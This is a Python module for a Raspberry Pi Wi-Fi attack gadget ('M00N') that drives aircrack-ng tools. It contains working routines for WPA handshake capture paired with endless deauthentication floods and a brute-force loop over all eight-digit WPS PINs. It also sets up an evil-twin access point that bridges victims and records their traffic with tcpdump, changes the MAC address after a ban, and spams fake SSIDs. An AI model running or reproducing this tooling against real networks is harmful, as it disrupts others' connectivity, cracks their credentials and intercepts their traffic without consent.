from libs.mojstd import *
import RPi.GPIO as GPIO
import os
import subprocess
import time
import threading

bk_ = 0

class netstd():
#NETWORK/INTERFACE MANAGEMENT
    def __init__(self, INTERFACE, selected_option=None, wps_pin=None):
        self.INTERFACE = INTERFACE
        self.stop_rickroll = threading.Event()
        self.airodump_process = None
        self.aireplay_process = None
        self.airodump_running = False
        self.aireplay_running = False

    def start_airodump(self, selected_ssid, selected_bssid, selected_chan, INTERFACE, dir='/root/M00N/wpa_handshakes/'):
        if not self.airodump_running:
            self.airodump_process = subprocess.Popen(
                ['sudo', 'airodump-ng', '-c', f'{selected_chan}', '--bssid', f'{selected_bssid}', '-w', dir+selected_ssid, f'{INTERFACE}'],
                stdin=subprocess.PIPE,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True,
                bufsize=4060
            )
            self.airodump_running = True

    def stop_airodump(self):
        if self.airodump_running:
            self.airodump_process.terminate()
            self.airodump_running = False

    def run_result(self, selected_option, INTERFACE, wps_pin):
        result = subprocess.run(
            ["nmcli", "dev", "wifi", "connect", selected_option, "infname", INTERFACE, "--wps-wps_pin", wps_pin],
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True
        )
        return result

    def bk(self):
        if GPIO.input(KEY3_PIN) == 0:
            return True

    def interface_select(self, INTERFACE):
        test = os.popen(f"iwconfig {INTERFACE} ")
        out = test.read()
        return 1 if "No such device" in out else 0

    def interface_start(self, INTERFACE):
        time.sleep(0.5)
        os.system(f"sudo airmon-ng check {INTERFACE}")
        os.system(f"sudo airmon-ng start {INTERFACE}")
        return 1 if self.bk() else 0

    def interface_start1(self, INTERFACE):
        os.system(f"sudo airmon-ng start {INTERFACE}")
        return 1 if self.bk() else 0

    def interface_stop(self, INTERFACE):
        os.system(f"sudo ifconfig {INTERFACE} down")
        os.system(f"sudo airmon-ng stop {INTERFACE}")
        return 1 if self.bk() else 0

# HANDSHAKE
    # HANDSHAKE CAPTURE
    def initialization(self, selected_chan, selected_ssid, selected_bssid, INTERFACE):
        print(selected_bssid,selected_chan,selected_ssid,INTERFACE)

        self.start_airodump(selected_ssid, selected_bssid, selected_chan, INTERFACE)
        ui_print("""Starting
handshake capture...""", "unset")

        if self.bk():
            self.stop_airodump()
            return 1

        time.sleep(5)
        ui_print("Loading...", "unset")

        if self.bk():
            self.stop_airodump()
            return 1
        # Write output
        if self.airodump_process.stdout.readline():
            with open("/root/M00N/logs/airodump.txt", 'w') as file:
                file.write(self.airodump_process.stdout.readline())
        #DEAUTH
        time.sleep(1)
        ui_print("""Starting deauth
attack...""", "unset")

        if not self.aireplay_process:
            self.aireplay_process = subprocess.Popen(
                ['sudo', 'aireplay-ng', '-a', f'{selected_bssid}', '--deauth', '0',  f'{INTERFACE}'],
                stdin=subprocess.PIPE,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True,
                bufsize=4060
            )
        self.aireplay_running = True

        if self.bk():
            self.aireplay_process.terminate()
            self.aireplay_running = False
            return 1

        time.sleep(2)
        with open("/root/M00N/logs/aireplay.txt", 'w') as file:
            file.write(self.aireplay_process.stdout.readline())

        if self.bk():
            self.stop_airodump()
            return 1
        start_time = time.time()
        timeout = 10 * 60
        ui_print("Loading...", 1)

        while True:
            with open("/root/M00N/logs/aireplay.txt", 'a') as file:
                file.write(self.aireplay_process.stdout.readline())

            with open("/root/M00N/logs/airodump.txt", 'a') as file:
                file.write(self.airodump_process.stdout.readline())

            ui_print("""Waiting the
4-way handshake""", "unset")
            # Check for errors
            # BSSID not found
            with open("/root/M00N/logs/aireplay.txt", 'r') as file:
                if "No such BSSID available." in file.read():
                    ui_print("""No such BSSID
available.""", 2, (255, 0, 0))
                    ui_print("Try again...", 2)
                    self.stop_airodump()
                    self.aireplay_process.terminate()
                    self.aireplay_running = False
                    self.airodump_running = False
                    self.interface_stop(INTERFACE)
                    time.sleep(1)
                    return 1
                #Generic error
                elif "Error" in file.read():
                    ui_print("Error", 2, (255, 0, 0))
                    ui_print("Try again...", 2)
                    self.stop_airodump()
                    self.aireplay_process.terminate()
                    self.aireplay_running = False
                    self.airodump_running = False
                    self.interface_stop(INTERFACE)
                    time.sleep(1)
                    return 1
            with open(f"/root/M00N/logs/airodump.txt", 'r') as file:
                    #WPA Handshake found
                    if "WPA handshake:" in file.read():
                        ui_print("Handshake captured!", 3, (0, 255, 142))
                        self.stop_airodump()
                        self.aireplay_process.terminate()
                        self.aireplay_running = False
                        self.airodump_running = False
                        ui_print("Going back...")
                        self.interface_stop(INTERFACE)
                        time.sleep(1)
                        return 0
                    #Wlan1 down
                    elif f"{INTERFACE} down" in file.read():
                        ui_print("MAC Banned!", 2, (255, 0, 0))
                        self.stop_airodump()
                        self.aireplay_process.terminate()
                        self.aireplay_running = False
                        self.airodump_running = False
                        os.system("macchanger -r " + INTERFACE)
                        self.interface_stop(INTERFACE)
                        ui_print("MAC Changed!", 2)
                        ui_print("Try again...", 2)
                        return 1

            if self.bk():
                self.stop_airodump()
                self.aireplay_process.terminate()
                self.aireplay_running = False
                self.airodump_running = False
                self.interface_stop(INTERFACE)
                return 1

            if time.time() - start_time > timeout:
                ui_print("Timeout After 10 min", 2, (255, 0, 0))
                self.stop_airodump()
                self.aireplay_process.terminate()
                self.aireplay_running = False
                self.airodump_running = False
                self.interface_stop(INTERFACE)
                return 2

            time.sleep(0.1)

#RAW SNIFF
    #AIRODUMP RAW SNIFFING
    def raw_sniff(self, selected_ssid, selected_bssid, selected_chan, INTERFACE):
        ui_print("""Starting
raw sniffing...""", "1")
        a = self.start_airodump(selected_ssid, selected_bssid, selected_chan, INTERFACE, dir="/root/M00N/RawSniff/")
        print(a)
        if self.bk():
            self.stop_airodump()
            self.airodump_running = False
            self.interface_stop(INTERFACE)
            return 1
        ui_print("Sniffing started", 1.5, (0, 255, 142))
        ui_print(f"""Sniffing:
{selected_ssid}""", "unset")
        while True:
            with open("/root/M00N/logs/airodump.txt", 'a') as file:
                file.write(self.airodump_process.stdout.readline())

            if self.bk():
                self.stop_airodump()
                self.airodump_running = False
                self.interface_stop(INTERFACE)
                return 1

# WPS
    # WPS BRUTE FORCE
    def generate(self):
        for var in range(0, 100000000):
            yield f"{var:08d}"

    def connect(self, selected_option, wps_pin, INTERFACE):
        try:
            result = self.run_result(selected_option, INTERFACE, wps_pin)

            if "successfully activated" in result.stdout.lower():
                ui_print(f"Connected'{selected_option}' \n PIN: {wps_pin}", 5)
                return 0
            else:
                ui_print(f"PIN {wps_pin} failed.")
                return 1

        except Exception as e:
            ui_print(f"Error {wps_pin}:\n {e}")
            with open("/root/M00N/logs/wps_out.txt", 'a') as file:
                file.write(f"Error {wps_pin}:\n {e}")
            return 1

    def brute_force_wps(self, selected_option, INTERFACE):
        for wps_pin in self.generate():
            if self.connect(selected_option, wps_pin, INTERFACE) == 0:
                ui_print(f"PIN : {wps_pin}")
                break
            else:
                pass
            time.sleep(0.1)
        return 0

#FAKE AP
    #EVIL TWIN
    def evil_twin(self, INTERFACE, selected_option, selected_bssid, selected_chan):
        #os.system(f"sudo airmon-ng check kill")
        subprocess.Popen(
        ['sudo', 'airbase-ng', '-a', selected_bssid, '-e', selected_option, '-c', str(selected_chan), INTERFACE],
        stdin=subprocess.PIPE,
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
        text=True,
        bufsize=1
        )
        commands = [
            "sudo ip link add name M00N_wlan type bridge",
            "sudo ip link set M00N_wlan up",
            #"sudo ip link set lo master M00N_wlan",
            "sudo ip link set at0 master M00N_wlan",
            "sudo dhclient M00N_wlan &",
            f"sudo aireplay-ng --deauth 1000 -a {selected_bssid} {INTERFACE} --ignore-negative-one",
        ]

        for i in commands:
            process = subprocess.Popen(i, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True, shell=True, bufsize=1)
            with open("/root/M00N/logs/evil_twin.log", 'a') as file:
                file.write(process.stdout.readline())
            time.sleep(0.5)
            print(i)
        process = subprocess.Popen(
            ['sudo', 'tcpdump', '-i', 'M00N_wlan', '-w', '/root/M00N/pcap/evil_twin.pcap'],
            stdin=subprocess.PIPE,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True,
            bufsize=1
        )
        with open("/root/M00N/logs/evil_twin.log", 'a') as file:
            file.write(process.stdout.readline())
        return 0

    def run_airbase_ng(self, ssid, chan, interface):
        subprocess.Popen(
            ['sudo', 'airbase-ng', '-e', f"{ssid}", '-c', str(chan), interface],
            stdin=subprocess.PIPE,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True,
            bufsize=1
        )

    def rickroll(self, INTERFACE, lists=["Never Gonna Give You Up", "Never Gonna Let You Down", "Never Gonna Run Around", "And Desert You", "Never Gonna Make You Cry", "Never Gonna Say Good Bye"], chan=1):
        threads = []
        for i in lists:
            thread = threading.Thread(target=self.run_airbase_ng, args=(i, chan, INTERFACE)).start()
            threads.append(thread)
            chan += 1
            if self.bk():
                self.stop_rickroll.set() #Stop
                print("stopping")
                for thread in threads:
                    thread.join() #Waits
                print("stopped")
                self.interface_stop()
                return 1

        while True:
            ui_print("Rickrolling...", "unset", (100, 40, 237))
            if self.bk():
                #disp.LCD_Clear()
                self.stop_rickroll.set() #Stop
                print("stopping")
                for thread in threads:
                    thread.join() #Waits
                print("stopped")
                self.interface_stop()
                return 1
            
#DEAUTH
    def deauth(self, selected_bssid, target, INTERFACE):
        ui_print("""Starting deauth
attack...""", "unset")
        if not self.aireplay_process:
            if target:
                self.aireplay_process = subprocess.Popen(
                    ['sudo', 'aireplay-ng', '-a', f'{selected_bssid}', '-c', f'{target}', '--deauth', '0',  f'{INTERFACE}'],
                    stdin=subprocess.PIPE,
                    stdout=subprocess.PIPE,
                    stderr=subprocess.PIPE,
                    text=True,
                    bufsize=1
                )
            else:
                self.aireplay_process = subprocess.Popen(
                    ['sudo', 'aireplay-ng', '-a', f'{selected_bssid}', '--deauth', '0',  f'{INTERFACE}'],
                    stdin=subprocess.PIPE,
                    stdout=subprocess.PIPE,
                    stderr=subprocess.PIPE,
                    text=True,
                    bufsize=1
                )
        self.aireplay_running = True
        if self.bk():
            self.aireplay_process.terminate()
            self.aireplay_running = False
            return 1
        time.sleep(2)
        with open("/root/M00N/logs/aireplay.txt", 'w') as file:
            file.write(self.aireplay_process.stdout.readline())

        if target:
            ui_print(f"""Deauthing:
{target}""", "unset", (0, 255, 142))
        else:
            ui_print(f"""Deauthing:
{selected_bssid}""", "unset", (0, 255, 142))
            
        while True:
            with open("/root/M00N/logs/aireplay.txt", 'a') as file:
                file.write(self.aireplay_process.stdout.readline())
            if self.bk():
                self.aireplay_process.terminate()
                self.aireplay_running = False
                return 1
            time.sleep(0.1)
